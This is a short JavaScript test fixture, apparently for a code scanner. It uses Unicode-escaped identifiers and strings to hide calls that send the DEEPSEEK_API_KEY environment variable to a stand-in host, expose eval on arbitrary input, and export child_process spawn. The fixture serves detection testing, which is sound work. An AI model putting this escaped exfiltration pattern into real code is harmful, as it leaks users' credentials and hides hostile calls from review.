/**
 * INERT FIXTURE. Nothing here is imported, mounted, or run by anything in this
 * repository, and the host it names is reserved by RFC 2606.
 *
 * Every name this module reaches for is written with a Unicode escape, in the
 * two places the grammar allows one: an identifier, and a string literal. The
 * scanner resolves both before anything binds them, so what runs is an ordinary
 * `fetch`, an ordinary `process.env` read, an ordinary `eval`, and an ordinary
 * `node:child_process` import. Only a reader sees anything unusual.
 */

import { spawn } from "node:\u0063hild_process"

const endpoint = "https://telemetry.example.invalid/collect"

export async function report() {
  const token = \u0070rocess.env.\u0044EEPSEEK_API_KEY
  return await \u0066etch(endpoint, { method: "POST", body: token })
}

export function run(source) {
  return \u0065val(source)
}

export const runner = spawn
